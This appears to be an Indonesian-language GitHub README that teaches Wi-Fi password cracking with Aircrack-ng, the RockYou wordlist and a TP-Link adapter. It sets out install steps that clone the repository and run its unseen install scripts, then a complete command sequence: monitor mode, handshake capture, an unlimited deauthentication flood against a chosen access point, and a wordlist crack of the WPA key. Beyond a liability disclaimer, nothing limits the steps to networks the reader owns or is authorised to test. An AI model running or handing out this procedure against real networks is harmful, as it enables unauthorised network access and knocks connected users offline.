# Peretasan WI-FI

![](https://github.com/rofidoang03/wifi-hacking/blob/main/gambar/gambar.jpeg)

> ⚠️ **Peringatan**: Repositori ini berisi tutorial mengenai peretasan WI-FI. Repositori ini disediakan semata-mata untuk tujuan edukasi dan pembelajaran. Jika ada tindakan perusakan, kejahatan, atau kriminalitas yang timbul dari penerapan informasi dalam repositori ini, dengan tegas, pembuat repositori ini tidak bertanggung jawab.

## Peralatan

Berikut ini adalah alat-alat yang diperlukan untuk melakukan peretasan WI-FI.

- Kali Linux
- Aircrack-ng 
- RockYou.txt
- TP-Link TLWN722N

## Aircrack-ng

Aircrack-ng adalah sebuah kumpulan perangkat lunak keamanan nirkabel yang dirancang untuk melakukan analisis dan pengujian keamanan pada jaringan Wi-Fi. Suite ini menyediakan serangkaian alat yang kuat untuk membantu profesional keamanan dan peneliti keamanan mengevaluasi tingkat keamanan dari jaringan Wi-Fi.


## Instalasi Aircrack-ng

Berikut ini adalah langkah-langkah untuk menginstal Aircrack-ng:

```
$ sudo apt-get update -y 
$ sudo apt-get upgrade -y
$ sudo apt-get install git -y
$ git clone https://github.com/rofidoang03/wifi-hacking/
$ cd wifi-hacking/aircrack-ng
$ chmod +x instal.sh
$ ./instal.sh
```

## RockYou.txt

RockYou.txt adalah sebuah wordlist yang sangat populer dan sering digunakan dalam uji penetrasi, penelitian keamanan, dan analisis kata sandi. Nama "RockYou" diambil dari perusahaan bernama RockYou, penyedia layanan aplikasi media sosial, yang mengalami pelanggaran keamanan pada tahun 2009. Wordlist ini menjadi terkenal karena mencakup jutaan kata sandi yang berasal dari data pengguna yang bocor pada insiden tersebut.

## Instal wordlist RockYou.txt

Berikut ini adalah langkah-langkah untuk menginstal RockYou.txt:

```
$ sudo apt-get update -y
$ sudo apt-get upgrade -y
$ sudo apt-get install git -y
$ git clone https://github.com/rofidoang03/wifi-hacking/
$ cd wifi-hacking/wordlists
$ chmod +x instal.sh
$ ./instal.sh
```

## TP-Link TLWN722N

TP-Link TL-WN722N adalah sebuah adaptor USB Wi-Fi yang dirancang untuk memberikan konektivitas nirkabel yang handal pada perangkat yang tidak memiliki kemampuan Wi-Fi bawaan. Dengan desain kompak dan performa yang baik, TL-WN722N menjadi pilihan populer untuk pengguna yang membutuhkan akses Wi-Fi pada desktop atau laptop.
  
## Instal Driver WI-FI TP-Link TLWN722N

Berikut ini adalah langkah-langkah untuk menginstal Driver WI-FI TP-Link TLWN722N:

```
$ sudo apt-get update -y
$ sudo apt-get upgrade -y
$ sudo apt-get install git -y
$ git clone https://github.com/rofidoang03/wifi-hacking/
$ cd wifi-hacking/rtl8188eus
$ chmod +x instal.sh
$ ./instal.sh
```

> Setelah memastikan semua peralatan yang diperlukan untuk melakukan peretasan Wi-Fi sudah tersedia, langkah-langkah berikut dapat diikuti untuk menjalankan proses peretasan Wi-Fi.

## Proses peretasan WI-FI

```
# Memastikan tidak ada konflik dengan proses lain yang menggunakan Wi-Fi
$ sudo airmon-ng check kill

# Memulai mode monitor pada antarmuka Wi-Fi yang dipilih
$ sudo airmon-ng start [interface]

# Menampilkan jaringan Wi-Fi yang tersedia dan informasi lainnya
$ sudo airodump-ng [interface]

# Merekam data jaringan Wi-Fi tertentu dengan menentukan BSSID, saluran, dan file output
$ sudo airodump-ng --bssid [alamat_BSSID] --channel [channel] --write [output] [interface]

# Melakukan serangan deauth untuk memaksa perangkat terhubung ulang dan merekam handshake
$ sudo aireplay-ng --deauth 0 -a [alamat_BSSID] [interface]

# Mengeksekusi aircrack-ng untuk menguraikan kunci dengan menggunakan wordlist
$ sudo aircrack-ng -a2 --wordlist [wordlist] [handshake file]
```
